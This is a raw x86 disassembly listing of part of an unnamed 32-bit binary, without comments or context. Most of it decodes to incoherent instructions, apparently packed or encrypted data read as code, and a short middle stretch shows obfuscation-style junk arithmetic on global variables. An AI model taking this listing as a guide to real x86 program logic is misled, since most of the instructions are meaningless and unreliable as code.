  403208:	fidiv  DWORD PTR [ebx-0x37]
  40320b:	push   edx
  40320c:	mov    ds:0x63f408dc,eax
  403212:	cs leave 
  403214:	fwait
  403215:	pop    ds
  403216:	xchg   ebp,eax
  403217:	push   edx
  403218:	data16 jbe 0x4031d6
  40321b:	and    ebx,esi
  40321d:	sbb    ah,dh
  40321f:	pop    ds
  403220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403221:	stos   BYTE PTR es:[edi],al
  403222:	sub    eax,DWORD PTR [ebx]
  403224:	into   
  403225:	xor    DWORD PTR [ecx-0x23],eax
  403228:	(bad)  
  403229:	(bad)  
  40322b:	push   0x5e
  40322d:	cmc    
  40322e:	les    edx,FWORD PTR [ebx+0xded141e]
  403234:	xor    eax,0xf5b76c66
  403239:	mov    al,0xd6
  40323b:	mov    esi,0x59b33100
  403240:	sbb    esi,edi
  403242:	ror    DWORD PTR [ebx],cl
  403244:	into   
  403245:	push   eax
  403246:	shl    BYTE PTR [ebx],1
  403248:	mov    ebp,0xed74c490
  40324d:	ds scas al,BYTE PTR es:[edi]
  40324f:	mov    dh,0x3
  403251:	adc    eax,0x4118cb3c
  403256:	ja     0x40326a
  403258:	mov    bl,0xff
  40325a:	ss test eax,0x7425aa1c
  403260:	mov    esi,0xa6a9bb5e
  403265:	jmp    0x8550a90d
  40326a:	outs   dx,BYTE PTR ds:[esi]
  40326b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40326c:	cmc    
  40326d:	repz push 0xffffffcd
  403270:	(bad)  
  403271:	ds retf 0x8b67
  403275:	mov    ebp,0x784806c6
  40327a:	xor    DWORD PTR [edx-0x72],eax
  40327d:	ins    DWORD PTR es:[edi],dx
  40327e:	sub    al,0xba
  403280:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403281:	lahf   
  403282:	adc    eax,0xa5367be1
  403287:	cmp    DWORD PTR [ecx-0x4d4c4d6a],ebx
  40328d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40328e:	cld    
  40328f:	pop    edi
  403290:	jne    0x4032a9
  403292:	or     bh,BYTE PTR [esi+ecx*1]
  403295:	(bad)  
  403296:	fs loope 0x403288
  403299:	(bad)  
  40329a:	dec    esi
  40329b:	push   ebp
  40329c:	mov    ch,bh
  40329e:	dec    ecx
  40329f:	es pop edi
  4032a1:	sub    DWORD PTR [edx],eax
  4032a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032a4:	es mov ebp,0x15682936
  4032aa:	sbb    DWORD PTR [edi],eax
  4032ac:	jb     0x403303
  4032ae:	and    DWORD PTR [edi+0x21fd654c],0xffffffe0
  4032b5:	sahf   
  4032b6:	(bad)  
  4032b7:	xor    ebp,DWORD PTR [ecx-0x30]
  4032ba:	cmc    
  4032bb:	aaa    
  4032bc:	and    BYTE PTR [ebp-0x2f02f4ee],ah
  4032c2:	inc    ecx
  4032c3:	xor    al,0xd9
  4032c5:	cmp    DWORD PTR [esi-0x2743ce0d],0x48b40789
  4032cf:	push   ecx
  4032d0:	mov    ch,0x73
  4032d2:	xchg   ebp,eax
  4032d3:	inc    ecx
  4032d4:	fdiv   QWORD PTR fs:[eax-0x22]
  4032d8:	je     0x4032a7
  4032da:	stos   DWORD PTR es:[edi],eax
  4032db:	jg     0x4032f3
  4032dd:	sti    
  4032de:	jbe    0x403297
  4032e0:	out    dx,al
  4032e1:	adc    BYTE PTR [ebx+eax*4+0x6d],bl
  4032e5:	mov    edi,0x7a18b847
  4032ea:	in     al,0xf8
  4032ec:	rcr    BYTE PTR [edi-0x22],cl
  4032ef:	test   cl,dl
  4032f1:	push   esi
  4032f2:	inc    edx
  4032f3:	jnp    0x4032d2
  4032f5:	push   cs
  4032f6:	or     al,0x80
  4032f8:	mov    dl,0x96
  4032fa:	dec    ebx
  4032fb:	push   0x51f5a115
  403300:	int    0x88
  403302:	and    eax,0x7aa25b7b
  403307:	mov    ?,WORD PTR [esi-0x7e]
  40330a:	push   ss
  40330b:	xor    eax,0x72582754
  403310:	sar    DWORD PTR [eax],cl
  403312:	pop    eax
  403313:	mov    esi,0xea5a18b
  403318:	stc    
  403319:	mul    DWORD PTR [ecx+eiz*2+0x455ac266]
  403320:	cdq    
  403321:	lods   eax,DWORD PTR ds:[esi]
  403322:	and    bl,al
  403324:	push   ds
  403325:	je     0x4032d4
  403327:	clc    
  403328:	mov    ch,0x75
  40332a:	adc    dh,BYTE PTR [esi-0x2117eebc]
  403330:	xor    DWORD PTR [ebp-0x748bab40],ecx
  403336:	or     DWORD PTR ds:0x2ec7efb9,esi
  40333c:	pop    ebx
  40333d:	sub    bl,BYTE PTR [ecx]
  40333f:	push   0x23758d44
  403344:	or     BYTE PTR [esi-0x1da016db],ch
  40334a:	xlat   BYTE PTR ds:[ebx]
  40334b:	inc    esp
  40334c:	or     eax,0xffffffa6
  40334f:	sub    esp,edx
  403351:	dec    ecx
  403352:	inc    edx
  403353:	jge    0x403371
  403355:	das    
  403356:	xor    BYTE PTR [ebx+0x51],0x71
  40335a:	xchg   esp,eax
  40335b:	xor    bh,BYTE PTR [eax]
  40335d:	push   ebp
  40335e:	and    eax,DWORD PTR [eax-0x2dd0f131]
  403364:	stos   DWORD PTR es:[edi],eax
  403365:	xor    BYTE PTR [esi],0x5b
  403368:	fbld   TBYTE PTR [eax-0x77]
  40336b:	xchg   ebp,eax
  40336c:	lea    edx,[edi+ecx*2]
  40336f:	sbb    dh,ah
  403371:	ret    
  403372:	in     al,0xa2
  403374:	mov    edx,0x1341f91e
  403379:	mov    DWORD PTR [esp+ebx*8],esp
  40337c:	in     al,dx
  40337d:	add    BYTE PTR [ebp+0x29a03e24],ch
  403383:	push   es
  403384:	sti    
  403385:	dec    ebp
  403386:	out    dx,eax
  403387:	das    
  403388:	hlt    
  403389:	mov    edi,0xb0417d9d
  40338e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40338f:	int3   
  403390:	mov    bh,0x32
  403392:	stos   DWORD PTR es:[edi],eax
  403393:	pop    eax
  403394:	mov    ds:0x418aed86,al
  403399:	inc    esp
  40339a:	sbb    DWORD PTR [ecx],esi
  40339c:	and    ebp,ecx
  40339e:	or     ebp,DWORD PTR [eax]
  4033a0:	add    dh,BYTE PTR [ebx]
  4033a2:	push   eax
  4033a3:	ja     0x40335e
  4033a5:	mov    bl,0x96
  4033a7:	es jle 0x403331
  4033aa:	ret    
  4033ab:	jp     0x403399
  4033ad:	xor    bh,BYTE PTR [ecx+0x73]
  4033b0:	(bad)  
  4033b1:	and    edx,DWORD PTR [ebx]
  4033b3:	xchg   esi,eax
  4033b4:	sbb    BYTE PTR [edx+0x4c],bh
  4033b7:	jo     0x403361
  4033b9:	push   esi
  4033ba:	add    edi,0xede76556
  4033c0:	repz add dl,ah
  4033c3:	scas   al,BYTE PTR es:[edi]
  4033c4:	sub    DWORD PTR ds:[edx],esp
  4033c7:	and    BYTE PTR [eax+edx*4-0x2],dl
  4033cb:	sbb    ebx,DWORD PTR [eax+ebx*2-0x6c4261c9]
  4033d2:	out    0xf3,eax
  4033d4:	ficom  WORD PTR [esi+0x53]
  4033d7:	mov    eax,0x79c6f6be
  4033dc:	lahf   
  4033dd:	(bad)  
  4033de:	out    dx,eax
  4033df:	stc    
  4033e0:	or     BYTE PTR [eax+0x108db750],dh
  4033e6:	mov    DWORD PTR [ebx+esi*2+0x2af22f07],edi
  4033ed:	push   0xc6bcedde
  4033f2:	add    esi,esp
  4033f4:	pop    ds
  4033f5:	cmp    bh,BYTE PTR [edi+0x64]
  4033f8:	mov    bh,0x38
  4033fa:	ret    
  4033fb:	sub    ch,BYTE PTR [ecx+0x23]
  4033fe:	lds    esp,FWORD PTR [esi-0x11]
  403401:	jecxz  0x403471
  403403:	repnz cwde 
  403405:	xor    ecx,edi
  403407:	iret   
  403408:	or     al,0x19
  40340a:	scas   eax,DWORD PTR es:[edi]
  40340b:	mov    ah,0xe0
  40340d:	rcl    DWORD PTR ss:[eax+eax*4+0x5be187e4],cl
  403415:	retf   0x8f87
  403418:	push   edi
  403419:	mov    ch,BYTE PTR [eax-0x56bda2f3]
  40341f:	loopne 0x4033c2
  403421:	ins    DWORD PTR es:[edi],dx
  403422:	xlat   BYTE PTR ds:[ebx]
  403423:	cmp    edi,DWORD PTR [ebx]
  403425:	jbe    0x403498
  403427:	cmp    cl,BYTE PTR [ebx]
  403429:	rcl    BYTE PTR [ecx],1
  40342b:	shr    DWORD PTR [edx],cl
  40342d:	bound  eax,QWORD PTR [ebx]
  40342f:	sbb    edi,DWORD PTR ss:[eax]
  403432:	push   ebx
  403433:	or     al,0x7a
  403435:	and    BYTE PTR [eax+0x33bd0c0b],bl
  40343b:	pop    ebx
  40343c:	add    edx,0x2b
  40343f:	or     al,0x11
  403441:	mov    ds:0x37fe53c8,al
  403446:	inc    esi
  403447:	xchg   ebx,eax
  403448:	sbb    eax,ebp
  40344a:	add    ecx,DWORD PTR [eax]
  40344c:	jge    0x403431
  40344e:	test   eax,0xc62a7a3d
  403453:	inc    ebp
  403454:	aas    
  403455:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403456:	jp     0x403425
  403458:	(bad)  
  403459:	icebp  
  40345a:	mov    ebp,0x79dc8d7b
  40345f:	cwde   
  403460:	push   eax
  403461:	cdq    
  403462:	cmp    BYTE PTR [ecx],dh
  403464:	ficom  WORD PTR [edi+0x5b319ede]
  40346a:	aam    0xd7
  40346c:	test   eax,ebp
  40346e:	pop    ecx
  40346f:	das    
  403470:	xor    eax,0xf273a624
  403475:	mov    esp,0xdd896e15
  40347a:	das    
  40347b:	or     ah,BYTE PTR [ebx-0x6b]
  40347e:	mov    ecx,0x1bf4bf70
  403483:	add    eax,0x87744651
  403488:	ins    DWORD PTR es:[edi],dx
  403489:	mov    dl,0x8f
  40348b:	mov    esp,0x62c91e82
  403490:	adc    ch,bl
  403492:	sbb    cl,BYTE PTR [edi-0x26]
  403495:	push   0xffffffe4
  403497:	mov    ds:0x690af550,eax
  40349c:	(bad)  
  40349d:	addr16 mov ecx,0x44c1463f
  4034a3:	mov    eax,0x4c3166fe
  4034a8:	xor    eax,0xfa8f8e5
  4034ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034ae:	cmp    bl,dh
  4034b0:	and    BYTE PTR [edi+0x1],0xfa
  4034b4:	or     eax,0x428ec434
  4034b9:	inc    esp
  4034ba:	mov    edi,0xc4eb9499
  4034bf:	or     al,0x58
  4034c1:	jmp    0xf0864ff5
  4034c6:	stos   DWORD PTR es:[edi],eax
  4034c7:	adc    edi,DWORD PTR ds:[esi-0x2a]
  4034cb:	imul   edx,ecx,0x3ddd3350
  4034d1:	push   ebx
  4034d2:	and    dl,BYTE PTR [eax+ebx*2-0x1460eb2a]
  4034d9:	pushf  
  4034da:	arpl   WORD PTR [esi-0x3cf1e575],si
  4034e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034e1:	cmp    al,0x93
  4034e3:	test   al,0x5f
  4034e5:	nop
  4034e6:	dec    esp
  4034e7:	or     BYTE PTR [ebx-0x1a],al
  4034ea:	push   esp
  4034eb:	clc    
  4034ec:	lods   al,BYTE PTR ss:[esi]
  4034ee:	adc    bl,BYTE PTR [ebx+0x7d]
  4034f1:	fidiv  WORD PTR [esi-0x28af60c6]
  4034f7:	aam    0x56
  4034f9:	iret   
  4034fa:	add    al,ah
  4034fc:	stos   BYTE PTR es:[edi],al
  4034fd:	adc    bl,BYTE PTR [esi+ecx*2+0x7b176542]
  403504:	int    0xd9
  403506:	adc    cl,cl
  403508:	(bad)  
  403509:	cmp    BYTE PTR [ecx+0x733dbea4],dh
  40350f:	pop    edi
  403510:	fiadd  DWORD PTR ss:[esi+eax*2-0x1e]
  403515:	add    edx,DWORD PTR [esi+0x2e]
  403518:	scas   al,BYTE PTR es:[edi]
  403519:	lods   eax,DWORD PTR ds:[esi]
  40351a:	mov    ch,0x23
  40351c:	inc    esp
  40351d:	lods   al,BYTE PTR ds:[esi]
  40351e:	or     edx,DWORD PTR [ebp-0x3a9d2d15]
  403524:	lods   eax,DWORD PTR ds:[esi]
  403525:	jge    0x4035a3
  403527:	in     al,dx
  403528:	inc    esi
  403529:	push   ebp
  40352a:	sub    DWORD PTR [esi+eax*1-0x347f68fc],esi
  403531:	xlat   BYTE PTR ds:[ebx]
  403532:	xor    BYTE PTR [edx-0x5ffc8d18],bh
  403538:	pop    edx
  403539:	repnz aas 
  40353b:	addr16 pop ebp
  40353d:	lds    edi,FWORD PTR [eax]
  40353f:	xchg   edx,eax
  403540:	fs push ds
  403542:	adc    eax,0x298657f9
  403547:	sbb    eax,DWORD PTR [eax]
  403549:	mov    ecx,0xc7160ce0
  40354e:	fisub  DWORD PTR [ecx]
  403550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403551:	retf   0x6f13
  403554:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403555:	jnp    0x4035b5
  403557:	ret    
  403558:	stos   BYTE PTR es:[edi],al
  403559:	mov    dl,0x68
  40355b:	dec    eax
  40355c:	mov    ebp,0x84c64c6
  403561:	sub    al,0xa8
  403563:	ret    0x7760
  403566:	aad    0x1
  403568:	jae    0x4035c5
  40356a:	dec    eax
  40356b:	imul   ebp,esi,0xd043d751
  403571:	pop    ss
  403572:	jbe    0x4035f0
  403574:	pop    ds
  403575:	scas   al,BYTE PTR es:[edi]
  403576:	sahf   
  403577:	mov    al,BYTE PTR [eax+0x68]
  40357a:	bound  edx,QWORD PTR [ebx-0x319c8fc5]
  403580:	mov    al,0x88
  403582:	xor    BYTE PTR [ecx-0x2e1ccf8c],0x7f
  403589:	adc    al,0x3d
  40358b:	xlat   BYTE PTR ds:[ebx]
  40358c:	hlt    
  40358d:	fsubrp st(3),st
  40358f:	ficomp WORD PTR [ebp+0x23]
  403592:	pop    es
  403593:	lods   eax,DWORD PTR ds:[esi]
  403594:	popf   
  403595:	retf   
  403596:	fwait
  403597:	mov    ecx,ebx
  403599:	pop    edi
  40359a:	in     al,dx
  40359b:	mov    edi,DWORD PTR [eax+edi*8]
  40359e:	loope  0x403552
  4035a0:	push   edx
  4035a1:	dec    esp
  4035a2:	mov    ecx,0xd40cf3eb
  4035a7:	jge    0x403587
  4035a9:	jge    0x403578
  4035ab:	mov    al,0x2e
  4035ad:	dec    ebx
  4035ae:	stos   DWORD PTR es:[edi],eax
  4035af:	xchg   DWORD PTR [ecx-0x481be965],edx
  4035b5:	dec    ebp
  4035b6:	inc    ecx
  4035b7:	ds ret 
  4035b9:	out    dx,al
  4035ba:	jo     0x40356c
  4035bc:	inc    edx
  4035bd:	jl     0x403592
  4035bf:	jne    0x40357a
  4035c1:	xlat   BYTE PTR ds:[ebx]
  4035c2:	or     DWORD PTR [eax-0xb],0xef6061dc
  4035c9:	xchg   edi,eax
  4035ca:	popf   
  4035cb:	inc    ebp
  4035cc:	call   ebx
  4035ce:	fwait
  4035cf:	lock int 0xda
  4035d2:	adc    al,0x33
  4035d4:	mov    edx,0xcf24a588
  4035d9:	out    0xe1,al
  4035db:	push   ebx
  4035dc:	sbb    eax,0x6f6008ba
  4035e1:	jmp    0x547a:0x1d18b033
  4035e8:	sti    
  4035e9:	jle    0x40360b
  4035eb:	shl    BYTE PTR [ebp-0x5bbf85d3],cl
  4035f1:	add    ecx,DWORD PTR [eax-0x9]
  4035f4:	cmc    
  4035f5:	cli    
  4035f6:	xor    DWORD PTR cs:[eax],0x5b
  4035fa:	pop    es
  4035fb:	mov    eax,ds:0x18648f2b
  403600:	ins    DWORD PTR es:[edi],dx
  403601:	dec    ecx
  403602:	lods   al,BYTE PTR ds:[esi]
  403603:	outs   dx,DWORD PTR ds:[esi]
  403604:	les    ebp,FWORD PTR [ecx]
  403606:	loope  0x40365e
  403608:	nop
  403609:	mov    ebx,0x677d270e
  40360e:	mul    edi
  403610:	mov    eax,ds:0x73e641ac
  403615:	mov    cl,0x31
  403617:	xchg   esp,eax
  403618:	shl    ah,0xec
  40361b:	cmc    
  40361c:	(bad)  
  40361d:	aaa    
  40361e:	out    dx,eax
  40361f:	jmp    0x64c7:0x5302d4a
  403626:	mov    bh,BYTE PTR [edx-0x33637ad1]
  40362c:	repnz pop esi
  40362e:	sahf   
  40362f:	arpl   ax,cx
  403631:	(bad)  
  403632:	clc    
  403633:	and    eax,0xbd5e0462
  403638:	xchg   edx,eax
  403639:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40363a:	jmp    0x4035e3
  40363c:	ja     0x4036bb
  40363e:	jmp    0x4036a1
  403640:	inc    edi
  403641:	daa    
  403642:	xor    DWORD PTR [esi-0x53a7a53],0x6f
  403649:	lahf   
  40364a:	and    cl,BYTE PTR [edx]
  40364c:	push   cs
  40364d:	sti    
  40364e:	push   cs
  40364f:	or     al,0x8
  403651:	pop    ds
  403652:	mov    WORD PTR [edx-0x44],?
  403655:	hlt    
  403656:	lock cli 
  403658:	inc    ecx
  403659:	(bad)  
  40365a:	hlt    
  40365b:	push   0x51
  40365d:	or     DWORD PTR [esi-0x60],ebx
  403660:	add    dl,BYTE PTR [ecx-0x6a]
  403663:	ins    DWORD PTR es:[edi],dx
  403664:	call   0xa0f49b11
  403669:	fs enter 0x42dc,0x13
  40366e:	mov    edi,edi
  403670:	shl    ah,1
  403672:	les    ebx,FWORD PTR [ebx]
  403674:	std    
  403675:	jno    0x403615
  403677:	repnz inc edi
  403679:	lods   al,BYTE PTR ds:[esi]
  40367a:	daa    
  40367b:	gs dec ebx
  40367d:	mov    edi,0x73c923db
  403682:	fstp   TBYTE PTR [edx-0xf7eb034]
  403688:	pop    esi
  403689:	jne    0x40368b
  40368b:	cmp    ch,BYTE PTR [esi]
  40368d:	push   edi
  40368e:	stos   DWORD PTR es:[edi],eax
  40368f:	stos   DWORD PTR es:[edi],eax
  403690:	ja     0x40363b
  403692:	cli    
  403693:	push   esi
  403694:	pop    esp
  403695:	pusha  
  403696:	aam    0x45
  403698:	ret    
  403699:	mov    al,ds:0x482c5b30
  40369e:	or     eax,DWORD PTR [edi-0x3c37f31]
  4036a4:	dec    eax
  4036a5:	xchg   ebx,eax
  4036a6:	mov    ecx,0xe614f43d
  4036ab:	and    edx,eax
  4036ad:	aam    0xdc
  4036af:	ret    0x3351
  4036b2:	sub    esp,edx
  4036b4:	mov    DWORD PTR [ebx+0x6bea3752],esp
  4036ba:	xor    dl,BYTE PTR [ebp-0x7d]
  4036bd:	out    0x88,eax
  4036bf:	pop    ebp
  4036c0:	(bad)  
  4036c1:	jle    0x403721
  4036c3:	lods   al,BYTE PTR ds:[esi]
  4036c4:	cmp    eax,0x241d674e
  4036c9:	and    al,0x4e
  4036cb:	ins    DWORD PTR es:[edi],dx
  4036cc:	cmp    DWORD PTR [edx],0xb2eced4d
  4036d2:	enter  0x5811,0x6b
  4036d6:	add    eax,0xe2a81579
  4036db:	clc    
  4036dc:	xchg   ebp,eax
  4036dd:	mov    al,0xf0
  4036df:	lahf   
  4036e0:	popf   
  4036e1:	dec    esi
  4036e2:	es cmc 
  4036e4:	and    eax,0xb3b1c046
  4036e9:	stos   DWORD PTR es:[edi],eax
  4036ea:	mov    ebp,0x3f5ad9d6
  4036ef:	outs   dx,BYTE PTR ds:[esi]
  4036f0:	mov    esi,0x4348ed4d
  4036f5:	mov    cl,0xf4
  4036f7:	(bad)  
  4036f8:	jge    0x403719
  4036fa:	leave  
  4036fb:	sbb    al,0x23
  4036fd:	call   0x69edf1ba
  403702:	pushf  
  403703:	dec    esi
  403704:	outs   dx,DWORD PTR ds:[esi]
  403705:	out    dx,eax
  403706:	and    BYTE PTR [ebx-0x5da7cc38],ah
  40370c:	pop    eax
  40370d:	push   es
  40370e:	jg     0x403748
  403710:	sub    DWORD PTR ds:0x46c27adc,esi
  403716:	div    DWORD PTR [esi]
  403718:	call   0x11dc25d2
  40371d:	adc    eax,0x83e44d8b
  403722:	cmp    eax,0x42291a
  403727:	add    bh,dh
  403729:	adc    eax,0x42292a
  40372e:	mov    edx,0x5d13
  403733:	movzx  edx,WORD PTR ds:0x42288a
  40373a:	jmp    0x403780
  40373f:	mov    DWORD PTR ds:0x4229aa,0xf15
  403749:	jg     0x40376e
  40374f:	push   DWORD PTR [ebp-0xc]
  403752:	call   DWORD PTR ds:0x42a174
  403758:	add    DWORD PTR ds:0x4228d2,ebx
  40375e:	xor    DWORD PTR ds:0x42296a,edi
  403764:	sub    DWORD PTR ds:0x4228ea,0x49b7
  40376e:	sub    edx,DWORD PTR ds:0x4228ca
  403774:	or     DWORD PTR ds:0x4228ce,edi
  40377a:	xor    DWORD PTR ds:0x4228f2,ebx
  403780:	mov    edx,DWORD PTR [ebp-0x2c]
  403783:	or     DWORD PTR ds:0x422942,0x4409
  40378d:	or     ecx,0x4f00
  403793:	and    ecx,edx
  403795:	mov    edx,DWORD PTR ds:0x422892
  40379b:	adc    edx,DWORD PTR ds:0x4229b6
  4037a1:	mov    DWORD PTR ds:0x422892,edx
  4037a7:	mov    edx,DWORD PTR [ebp-0x34]
  4037aa:	adc    DWORD PTR ds:0x4229b2,0x1e82
  4037b4:	or     ecx,edx
  4037b6:	adc    DWORD PTR ds:0x4228ba,0x5785
  4037c0:	xor    ecx,0x5fdd
  4037c6:	cmp    ecx,DWORD PTR [eax]
  4037c8:	jne    0x41a17f
  4037ce:	and    DWORD PTR ds:0x42297a,0x68cd
  4037d8:	mov    ecx,DWORD PTR [esi]
  4037da:	sub    DWORD PTR ds:0x42297a,0x1779
  4037e4:	mov    eax,DWORD PTR [esi+0x4]
  4037e7:	and    edx,0xf6b
  4037ed:	shrd   ecx,eax,0x2
  4037f1:	shr    eax,0x2
  4037f4:	sbb    edx,DWORD PTR ds:0x4228e2
  4037fa:	mov    eax,DWORD PTR [esi]
  4037fc:	and    edx,DWORD PTR ds:0x4229d2
  403802:	mov    edx,DWORD PTR [esi+0x4]
  403805:	shl    eax,0x1e
  403808:	add    DWORD PTR ds:0x4229ae,0x4229ca
  403812:	xor    ecx,edi
  403814:	sub    DWORD PTR ds:0x42292a,0x2cc5
  40381e:	jmp    0x403da8
  403823:	add    al,0xf4
  403825:	sbb    al,0x30
  403827:	sbb    al,0x28
  403829:	clc    
  40382a:	sbb    BYTE PTR [ecx+edi*2],ch
  40382d:	jb     0x4038a1
  40382f:	ins    DWORD PTR es:[edi],dx
  403830:	push   ecx
  403831:	outs   dx,BYTE PTR ds:[esi]
  403832:	jb     0x403857
  403834:	xlat   BYTE PTR ds:[ebx]
  403835:	push   ss
  403836:	push   ss
  403837:	cmp    eax,0x5a161604
  40383c:	lock test al,0xe6
  40383f:	int3   
  403840:	ret    
  403841:	mov    ecx,DWORD PTR [esi-0x21]
  403844:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403845:	jo     0x403894
  403847:	sub    eax,0x51f3903e
  40384c:	add    esi,DWORD PTR [ecx+0x3eb38588]
  403852:	arpl   WORD PTR [ebx+0x60],bx
  403855:	sbb    al,al
  403857:	aaa    
  403858:	jge    0x403841
  40385a:	xor    bl,dh
  40385c:	cmp    bl,BYTE PTR [ecx+0xaa82d0]
  403862:	sub    eax,0xcce2593e
  403867:	pop    ebx
  403868:	cmp    BYTE PTR [eax],0xdc
  40386b:	rcr    eax,1
  40386d:	sti    
  40386e:	mov    dl,BYTE PTR [eax-0x46b7f482]
  403874:	pusha  
  403875:	mov    ah,BYTE PTR fs:[edi]
  403878:	out    0x95,al
  40387a:	pop    edx
  40387b:	sub    DWORD PTR [ebx-0x3],eax
  40387e:	sub    eax,0x3f0047b1
  403883:	push   esi
  403884:	in     eax,dx
  403885:	scas   eax,DWORD PTR es:[edi]
  403886:	stos   BYTE PTR es:[edi],al
  403887:	dec    ebx
  403888:	xchg   ebx,eax
  403889:	mov    edx,0xd14981bd
  40388e:	add    edi,DWORD PTR [ebp-0x2]
  403891:	lock push ss
  403893:	jbe    0x40386b
  403895:	xchg   ebx,eax
  403896:	adc    DWORD PTR [ebx-0x66],ebx
  403899:	sub    esp,DWORD PTR [eax-0x48eb6c3a]
  40389f:	inc    ebx
  4038a0:	loop   0x40387b
  4038a2:	pop    edi
  4038a3:	push   cs
  4038a4:	cmp    DWORD PTR [ebx-0x7d684747],edi
  4038aa:	push   ecx
  4038ab:	xor    bl,ah
  4038ad:	bound  ebx,QWORD PTR [ebx+0x25a5c8f4]
  4038b3:	mov    bh,0x16
  4038b5:	(bad)  
  4038b6:	jns    0x403842
  4038b8:	sbb    eax,0x3490e519
  4038bd:	xchg   ebp,eax
  4038be:	pop    esi
  4038bf:	loope  0x403882
  4038c1:	xchg   ebx,eax
  4038c2:	jne    0x40391a
  4038c4:	aas    
  4038c5:	inc    edi
  4038c6:	fisttp WORD PTR [edi+0x27356e45]
  4038cc:	push   0xde170ca9
  4038d1:	push   ebx
  4038d2:	fstp   QWORD PTR fs:[esi]
  4038d5:	fnstcw WORD PTR [edi]
  4038d7:	(bad)  
  4038d8:	push   edx
  4038d9:	cmp    eax,0x1b54f77d
  4038de:	les    esp,FWORD PTR ds:0x13feec7a
  4038e4:	xor    BYTE PTR [edx],bl
  4038e6:	test   DWORD PTR [edx+edi*2+0x4f],ecx
  4038ea:	pop    ds
  4038eb:	mov    ebx,DWORD PTR [ebx+edx*8]
  4038ee:	or     al,0x7b
  4038f0:	pop    eax
  4038f1:	repz icebp 
  4038f3:	mov    ss,eax
  4038f5:	cmp    al,BYTE PTR [eax-0x10]
  4038f8:	aam    0xb6
  4038fa:	aaa    
  4038fb:	and    eax,0x381486e1
  403900:	jns    0x40389c
  403902:	or     al,0x4f
  403904:	mov    eax,0xd8dff3ab
  403909:	daa    
  40390a:	nop
  40390b:	enter  0xaed4,0x6a
  40390f:	ds retf 
  403911:	push   es
  403912:	inc    esp
  403913:	mov    al,0xdc
  403915:	repz shr DWORD PTR [ebx],1
  403918:	rcr    BYTE PTR [ecx],1
  40391a:	sbb    DWORD PTR [edx-0xab4f7a9],esp
  403920:	dec    ecx
  403921:	xor    DWORD PTR [ecx-0xbd43754],esp
  403927:	xchg   ebx,eax
  403928:	addr16 js 0x403949
  40392b:	sbb    dh,BYTE PTR [esi+0x2d]
  40392e:	bound  edi,QWORD PTR [ecx+0x6112f67c]
  403934:	aam    0x16
  403936:	fdiv   st,st(4)
  403938:	or     edx,ebx
  40393a:	test   eax,0x700ff30b
  40393f:	add    eax,0x75b25cf6
  403944:	push   0xffffffaa
  403946:	mov    esp,0x2234fbe8
  40394b:	fild   DWORD PTR [esp+esi*1-0x3344ac0a]
  403952:	sete   BYTE PTR [edx+ebx*1]
  403956:	xchg   eax,edi
  403958:	xor    esp,DWORD PTR [edi+0x7885d146]
  40395e:	(bad)  
  40395f:	sbb    cl,BYTE PTR [edi+0x704cdb5f]
  403965:	jae    0x4039c4
  403967:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403968:	xchg   esi,eax
  403969:	arpl   cx,bx
  40396b:	inc    edi
  40396c:	or     BYTE PTR [ebx],dh
  40396e:	adc    DWORD PTR [ebx-0x12b46a5f],esp
  403974:	inc    edx
  403975:	or     dl,ch
  403977:	mov    ah,0x58
  403979:	test   BYTE PTR [edi],ah
  40397b:	sbb    ecx,DWORD PTR [ebx+edx*1+0x7a3e832d]
  403982:	fdiv   QWORD PTR [esi+0x23]
  403985:	hlt    
  403986:	lods   eax,DWORD PTR ds:[si]
  403988:	es push edi
  40398a:	ret    0xc48a
  40398d:	leave  
  40398e:	dec    esi
  40398f:	icebp  
  403990:	cmp    cl,ah
  403992:	inc    edi
  403993:	inc    edi
  403994:	add    DWORD PTR [esi+0x5],esi
  403997:	xchg   DWORD PTR ds:0xa8ab7aed,ebx
  40399d:	je     0x4039bf
  40399f:	inc    esp
  4039a0:	inc    edi
  4039a1:	jo     0x4039fe
  4039a3:	mov    ebp,?
  4039a5:	sub    eax,0xa886bd1a
  4039aa:	xchg   edi,eax
  4039ab:	mov    eax,0xf4d3f7e1
  4039b0:	iret   
  4039b1:	jb     0x40399a
  4039b3:	popf   
  4039b4:	int3   
  4039b5:	retf   
  4039b6:	sbb    DWORD PTR [ebp+0x7ccf5e5b],ebx
  4039bc:	push   ds
  4039bd:	xchg   edi,edx
  4039bf:	outs   dx,DWORD PTR ds:[esi]
  4039c0:	push   0x7fc6e98f
  4039c5:	test   al,0xc5
  4039c7:	jo     0x403951
  4039c9:	outs   dx,BYTE PTR ds:[esi]
  4039ca:	in     eax,0x14
  4039cc:	xchg   esp,eax
  4039cd:	jns    0x403a30
  4039cf:	fsubr  st(2),st
  4039d1:	daa    
  4039d2:	fidivr DWORD PTR [esi+edi*8+0xe]
  4039d6:	or     eax,edi
  4039d8:	and    cl,al
  4039da:	test   al,0xc0
  4039dc:	scas   eax,DWORD PTR es:[edi]
  4039dd:	cmc    
  4039de:	jae    0x403a14
  4039e0:	sub    eax,0x7c545c41
  4039e5:	sbb    ah,BYTE PTR [eax]
  4039e7:	mov    bh,dh
  4039e9:	sbb    al,0xac
  4039eb:	or     dh,BYTE PTR [ebx]
  4039ed:	popa   
  4039ee:	scas   al,BYTE PTR es:[edi]
  4039ef:	pusha  
  4039f0:	mov    ch,0x8c
  4039f2:	or     DWORD PTR [ebx-0x22828e4],esi
  4039f8:	in     eax,dx
  4039f9:	outs   dx,DWORD PTR ds:[esi]
  4039fa:	push   es
  4039fb:	cld    
  4039fc:	fsubr  QWORD PTR gs:[edi-0x698852e8]
  403a03:	dec    esi
  403a04:	mov    ?,eax
  403a06:	mov    ds:0x9a57ba19,al
  403a0b:	dec    ebp
  403a0c:	jnp    0x403a30
  403a0e:	mov    al,0xc9
  403a10:	push   ecx
  403a11:	push   ss
